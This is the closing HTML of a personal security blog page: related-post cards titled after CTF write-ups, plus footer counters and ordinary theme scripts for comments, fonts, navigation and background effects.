        
            <div class="article-image">
                <img src="/p/moectf_2025/moectf2025.786095b001377718ee3c30de18de1b10_hu_4c5ec6589984cda4.webp" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Moectf_2025"
                        
                        data-hash="md5-eGCVsAE3dxjuPDDeGN4bEA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Moectf_2025</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/2025bjtuctf-pwn/">
        
        
            <div class="article-image">
                <img src="/p/2025bjtuctf-pwn/BJTUCTF.90f5cd42e21881be44253e37d54b6795_hu_13bcc8b29ab9b122.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post 2025BJTUCTF-PWN"
                        
                        data-hash="md5-kPXNQuIYgb5EJT431UtnlQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">2025BJTUCTF-PWN</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/moectf_2024/">
        
        
            <div class="article-image">
                <img src="/p/moectf_2024/moectf2024.cc156646db374bf0b7ce7c58c0298814_hu_50f438f2977ee422.webp" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Moectf_2024"
                        
                        data-hash="md5-zBVmRts3S/C3znxYwCmIFA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Moectf_2024</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">
        
        
            <div class="article-image">
                <img src="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd2.521ea07b270c9bd08b40b043442201c4_hu_e37e9b7340f094d8.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post ç¬¬äºŒæ¬¡AWDæ°´å‹èµ›"
                        
                        data-hash="md5-Uh6geycMm9CLQLBDRCIBxA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ç¬¬äºŒæ¬¡AWDæ°´å‹èµ›</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">
        
        
            <div class="article-image">
                <img src="/p/%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd1.ea997f807707c69a201fedb82801556a_hu_c07e85acdb17771f.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post ç¬¬ä¸€æ¬¡AWDæ°´å‹èµ›"
                        
                        data-hash="md5-6pl/gHcHxpogH&#43;24KAFVag==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ç¬¬ä¸€æ¬¡AWDæ°´å‹èµ›</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script
    src="https://giscus.app/client.js"
    data-repo="Expl0rer-Ct/Expl0rer.Ct-s-Blog"
    data-repo-id="R_kgDOPd0X7g"
    data-category="Announcements"
    data-category-id="DIC_kwDOPd0X7s4CuMr6"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="light"
    data-lang="en"
    data-loading=""
    crossorigin="anonymous"
    async
></script>
<script>
    function setGiscusTheme(theme) {
        let giscus = document.querySelector("iframe.giscus-frame");
        if (giscus) {
            giscus.contentWindow.postMessage(
                {
                    giscus: {
                        setConfig: {
                            theme: theme,
                        },
                    },
                },
                "https://giscus.app"
            );
        }
    }

    (function () {
        addEventListener("message", (e) => {
            if (event.origin !== "https://giscus.app") return;
            handler();
        });
        window.addEventListener("onColorSchemeChange", handler);

        function handler() {
            if (document.documentElement.dataset.scheme === "light") {
                setGiscusTheme('light');
            } else {
                setGiscusTheme('dark');
            }
        }
    })();
</script>

    

    
<script defer src="https://events.vercount.one/js"></script>
<footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Expl0rer.Ct
    </section>
    
    <section class="powerby">
        



        

















































        
<section class="wordcount">
  <div class="wordcount-row">
    <p>åšä¸»å‘å¸ƒäº†19ç¯‡æ–‡ç«   ||</p>
    <p>æ€»å…±252.62k å­—</p>
  </div>
</section>
        
  


<a>æ€»è®¿å®¢æ•°: </a><span id='busuanzi_value_site_uv'>åˆ«æ€¥åœ¨åŠ è½½ä¸­äº†...</span> <a> | </a> <a>æ€»è®¿é—®é‡: </a><span id='busuanzi_value_site_pv'>åŠ è½½ä¸­...</span></br>



<div class="site-uptime-container">
  <span id="timeDate" class="site-uptime-text">è½½å…¥å¤©æ•°...</span>
  <span id="times" class="site-uptime-text">è½½å…¥æ—¶åˆ†ç§’...</span>
</div>

<script language="javascript"> 
    var now = new Date();
    function createtime(){
        now.setTime(now.getTime()+250); 
        var grt= new Date("2025/08/01 00:00:00"); 
        days = (now - grt ) / 1000 / 60 / 60 / 24;
        dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
        hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;}
        minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes);
        if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds);
        if(String(snum).length ==1 ){snum = "0" + snum;}

        document.getElementById("timeDate").innerHTML = "æœ¬ç«™å·²ç¨³å®šè¿è¡Œ"+dnum+" å¤© ";document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’"
    }
    setInterval("createtime()",250); 
</script> 

<script>
    (function(u, c) {
      var d = document, t = 'script', o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function(e) { c(e); }); }
      s.parentNode.insertBefore(o, s);
    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
      pangu.spacingPage();
    });
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdnjs.cloudflare.com/ajax/libs/node-vibrant/3.1.6/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script><script type="text/javascript" src="/ts/custom.89d9bb2c3c071ae8a261f67661c22b84ef67ba7b7a885dabd2bbd9ebef84ed40.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>


<head>
  
  <link rel="preconnect" href="https://fonts.font.im" crossorigin>
  <link 
    href="https://fonts.font.im/css?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-cn"
  >
  
  
  <link 
    href="https://fonts.googleapis.com/css2?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-en"
    disabled
  >
  
  <script>
    
    document.querySelector('#font-cn').addEventListener('load', function() {
      document.querySelector('#font-en').disabled = true;
    }).addEventListener('error', function() {
      document.querySelector('#font-en').disabled = false;
      document.querySelector('#font-en').media = 'all';
    });
  </script>
  
  <noscript>
    <link 
      href="https://fonts.font.im/css?family=PT+Sans" 
      rel="stylesheet"
    >
  </noscript>
</head>

<style>
    #TableOfContents > ul ul,
    #TableOfContents > ul ol,
    #TableOfContents > ol ul,
    #TableOfContents > ol ol {
        display: none;
    }
    #TableOfContents > ul .open,
    #TableOfContents > ol .open {
        display: block;
    }
</style>

<script>
    function initTocHide() {
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        window.addEventListener('scroll', function() {
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                const parent = ul.parentElement;
                ul = parent ? parent.parentElement : null;
            } while (ul && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>


<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://expl0rer.top/icons/backTop.svg);
    }
</style>

<script>
    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        window.addEventListener('scroll', function() {
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        });
    }

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<style>
    .highlight {
        max-height: 400px;
        overflow: hidden;
    }

    .code-show {
        max-height: none !important;
    }

    .code-more-box {
        width: 100%;
        padding-top: 78px;
        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
        position: absolute;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 1;
    }

    .code-more-btn {
        display: block;
        margin: auto;
        width: 44px;
        height: 22px;
        background: #f0f0f5;
        border-top-left-radius: 8px;
        border-top-right-radius: 8px;
        padding-top: 6px;
        cursor: pointer;
    }

    .code-more-img {
        cursor: pointer !important;
        display: block;
        margin: auto;
        width: 22px;
        height: 16px;
    }
</style>

<script>
  function initCodeMoreBox() {
    let codeBlocks = document.querySelectorAll(".highlight");
    if (!codeBlocks) {
      return;
    }
    codeBlocks.forEach(codeBlock => {
      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
        return;
      }
      let codeMoreBox = document.createElement('div');
      codeMoreBox.classList.add('code-more-box');
      let codeMoreBtn = document.createElement('span');
      codeMoreBtn.classList.add('code-more-btn');
      codeMoreBtn.addEventListener('click', () => {
        codeBlock.classList.add('code-show');
        codeMoreBox.style.display = 'none';
        window.dispatchEvent(new Event('resize'))
      })
      let img = document.createElement('img');
      img.classList.add('code-more-img');
      img.src = "https:\/\/expl0rer.top\/icons\/codeMore.png"
      codeMoreBtn.appendChild(img);
      codeMoreBox.appendChild(codeMoreBtn);
      codeBlock.appendChild(codeMoreBox)
    })
  }
  
  initCodeMoreBox();
</script>






<script>
    function showHideView() {
        let viewCounts = document.querySelectorAll("#viewCount");
        if (viewCounts) {
            let article =  document.querySelector(".article-page");
            if (!article) {
                viewCounts.forEach(ele => {
                    ele.style.display = 'none';
                });
            }
        }
    }
    
    showHideView();
</script>

<script src="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.css" crossorigin="anonymous" />
<script>
    NProgress.start();
    document.addEventListener("readystatechange", () => {
        if (document.readyState === "interactive") NProgress.inc(0.8);
        if (document.readyState === "complete") NProgress.done();
    });
</script>


<script>
    var pjax = new pjax({
        selectors: [
            ".main-container"
        ]
    })

</script>

<script>
    pjax._handleResponse = pjax.handleResponse;
    pjax.handleResponse = function(responseText, request, href, options) {
        if (request.responseText.match("<html")) {
            if (responseText) {
                let newDom = new DOMParser().parseFromString(responseText, 'text/html');
                let bodyClass = newDom.body.className;
                document.body.setAttribute("class", bodyClass)
            }
            pjax._handleResponse(responseText, request, href, options);
        } else {
        }
    }
</script>



<script>
    document.addEventListener('pjax:complete', () => {
        if (window.Stack && typeof window.Stack.init === 'function') {
            window.Stack.init();
        }
    })
</script>

<div id="particles-js"></div>

<script src="https://expl0rer.top/background/particles.min.js"></script>
<script>
  particlesJS.load('particles-js', "https:\/\/expl0rer.top\/background\/particlesjs-config.json", function() {
    console.log('particles.js loaded - callback');
  });
</script>

<style>
  #particles-js {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    z-index: -1;
  }
</style>


<script src="https://expl0rer.top/background/sakura.js"></script>

    </body>
</html>
